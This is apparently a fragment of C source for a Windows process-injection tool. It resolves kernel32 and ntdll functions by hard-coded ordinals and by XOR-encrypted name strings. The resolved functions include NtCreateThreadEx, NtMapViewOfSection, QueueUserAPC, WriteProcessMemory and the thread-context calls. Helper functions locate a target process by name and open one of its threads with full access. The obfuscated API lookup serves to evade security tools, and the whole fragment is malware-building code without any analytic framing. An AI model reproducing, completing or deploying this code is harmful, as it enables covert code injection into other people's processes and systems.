    pVirtualProtect = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x5e1);
    pVirtualProtectEx = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x5e2);
    pCreateThread = MyGetProcAddressByOrdinal(lpvKernelDLL, 0xf6);
    pCreateRemoteThread = MyGetProcAddressByOrdinal(lpvKernelDLL, 0xeb);
    pWaitForSingleObject = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x5ec);
    pVirtualFree = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x5de);
    pVirtualFreeEx = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x5df);
    pCloseHandle = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x8a);
    pGetThreadContext = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x302);
    pSetThreadContext = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x567);
    pSuspendThread = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x599);
    pResumeThread = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x4d5);
    pQueueUserAPC = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x45d);
    pSleep = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x591);
    pFreeLibrary = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x1b5);
    pGetProcAddress = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x2b9);
    pCreateFileA = MyGetProcAddressByOrdinal(lpvKernelDLL, 0xc7);
    pWriteFile = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x627);
#else
    pOpenFile = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x406);
    pLoadLibraryA = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x3c7);
    pGetFileSize = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x251);
    pCreateToolhelp32Snapshot = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x102);
    pProcess32First = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x42f);
    pProcess32Next = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x431);
    pThread32First = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x5a3);
    pThread32Next = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x5a4);
    pGetCurrentProcess = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x21d);
    pGetModuleHandleA = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x27b);
    pCreateProcessA = MyGetProcAddressByOrdinal(lpvKernelDLL, 0xe6);
    pOpenProcess = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x411);
    pOpenThread = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x418);
    pVirtualAlloc = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x5cd);
    pVirtualAllocEx = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x5ce);
    pWriteProcessMemory = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x622);
    pReadProcessMemory = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x47b);
    pReadFile = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x478);
    pVirtualProtect = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x5d3);
    pVirtualProtectEx = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x5d4);
    pCreateThread = MyGetProcAddressByOrdinal(lpvKernelDLL, 0xf9);
    pCreateRemoteThread = MyGetProcAddressByOrdinal(lpvKernelDLL, 0xed);
    pWaitForSingleObject = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x5de);
    pVirtualFree = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x5d0);
    pVirtualFreeEx = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x5d1);
    pCloseHandle = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x8c);
    pGetThreadContext = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x2fd);
    pSetThreadContext = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x55b);
    pSuspendThread = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x58c);
    pResumeThread = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x4d2);
    pSleep = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x584);
    pQueueUserAPC = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x45b);
    pFreeLibrary = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x1b1);
    pGetProcAddress = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x2b4);
    pCreateFileA = MyGetProcAddressByOrdinal(lpvKernelDLL, 0xc9);
    pWriteFile = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x619);
#endif
}

void PopulateNTDLLFunctionPtrsByName(LPVOID lpvNTDLL)
{
    char cNtCreateThreadEx[] = {0x7e, 0x44, 0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0x75, 0x48, 0};
    MyXor(cNtCreateThreadEx, 16, key, key_len);
    pNTCreateThreadEx = MyGetProcAddressByName(lpvNTDLL, cNtCreateThreadEx);

    char cRTLCreateUserThread[] = {0x62, 0x44, 0x5c, 0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x65, 0x43, 0x55, 0x42, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0};
    MyXor(cRTLCreateUserThread, 19, key, key_len);
    pRTLCreateUserThread = MyGetProcAddressByName(lpvNTDLL, cRTLCreateUserThread);

    char cNTCreateSection[] = {0x7e, 0x44, 0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x63, 0x55, 0x53, 0x44, 0x59, 0x5f, 0x5e, 0};
    MyXor(cNTCreateSection, 15, key, key_len);
    pNTCreateSection = MyGetProcAddressByName(lpvNTDLL, cNTCreateSection);

    char cNTMapViewOfSection[] = {0x7e, 0x44, 0x7d, 0x51, 0x40, 0x66, 0x59, 0x55, 0x47, 0x7f, 0x56, 0x63, 0x55, 0x53, 0x44, 0x59, 0x5f, 0x5e, 0};
    MyXor(cNTMapViewOfSection, 18, key, key_len);
    pNTMapViewOfSection = MyGetProcAddressByName(lpvNTDLL, cNTMapViewOfSection);

    char cNtQueryInformationProcess[] = {0x7e, 0x44, 0x61, 0x45, 0x55, 0x42, 0x49, 0x79, 0x5e, 0x56, 0x5f, 0x42, 0x5d, 0x51, 0x44, 0x59, 0x5f, 0x5e, 0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0};
    MyXor(cNtQueryInformationProcess, 25, key, key_len);
    pNtQueryInformationProcess = MyGetProcAddressByName(lpvNTDLL, cNtQueryInformationProcess);

    char cNTFlushInstructionCache[] = {0x7e, 0x44, 0x76, 0x5c, 0x45, 0x43, 0x58, 0x79, 0x5e, 0x43, 0x44, 0x42, 0x45, 0x53, 0x44, 0x59, 0x5f, 0x5e, 0x73, 0x51, 0x53, 0x58, 0x55, 0};
    MyXor(cNTFlushInstructionCache, 23, key, key_len);
    pNTFlushInstructionCache = MyGetProcAddressByName(lpvNTDLL, cNTFlushInstructionCache);
}

void PopulateNTDLLFunctionPtrsByOrdinal(LPVOID lpvNTDLL)
{
#ifdef _M_X64
    pNTCreateThreadEx = MyGetProcAddressByOrdinal(lpvNTDLL, 0x13b);
    pRTLCreateUserThread = MyGetProcAddressByOrdinal(lpvNTDLL, 0x364);
    pNTCreateSection = MyGetProcAddressByOrdinal(lpvNTDLL, 0x136);
    pNTMapViewOfSection = MyGetProcAddressByOrdinal(lpvNTDLL, 0x19d);
    pNtQueryInformationProcess = MyGetProcAddressByOrdinal(lpvNTDLL, 0x1e7);
    pNTFlushInstructionCache = MyGetProcAddressByOrdinal(lpvNTDLL, 0x16a);
#else
    pNTCreateThreadEx = MyGetProcAddressByOrdinal(lpvNTDLL, 0x142);
    pRTLCreateUserThread = MyGetProcAddressByOrdinal(lpvNTDLL, 0x374);
    pNTCreateSection = MyGetProcAddressByOrdinal(lpvNTDLL, 0x13e);
    pNTMapViewOfSection = MyGetProcAddressByOrdinal(lpvNTDLL, 0x1a6);
    pNtQueryInformationProcess = MyGetProcAddressByOrdinal(lpvNTDLL, 0x1f0);
    pNTFlushInstructionCache = MyGetProcAddressByOrdinal(lpvNTDLL, 0x173);
#endif
}

DWORD FindTargetProcessID(CHAR *sTargetName)
{
    DWORD dwRetVal = -1;
    HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapShot == INVALID_HANDLE_VALUE)
    {
        goto shutdown;
    }

    PROCESSENTRY32 ProcessEntry;
    ProcessEntry.dwSize = sizeof(PROCESSENTRY32);

    if (!pProcess32First(hSnapShot, &ProcessEntry))
    {
        goto shutdown;
    }

    while (pProcess32Next(hSnapShot, &ProcessEntry))
    {
        if (MyStrCmpiAA(sTargetName, ProcessEntry.szExeFile))
        {
            return ProcessEntry.th32ProcessID;
        }
    }

shutdown:
    pCloseHandle(hSnapShot);

    return dwRetVal;
}

HANDLE FindProcessThread(DWORD dwPid)
{
    HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    if (hSnapShot == NULL)
    {
        goto shutdown;
    }

    THREADENTRY32 ThreadEntry;
    ThreadEntry.dwSize = sizeof(THREADENTRY32);

    if (!pThread32First(hSnapShot, &ThreadEntry))
    {
        goto shutdown;
    }

    while (pThread32Next(hSnapShot, &ThreadEntry))
    {
        if (ThreadEntry.th32OwnerProcessID == dwPid)
        {
            return pOpenThread(THREAD_ALL_ACCESS, FALSE, ThreadEntry.th32ThreadID);
        }
    }

shutdown:
    return NULL;
}

#endif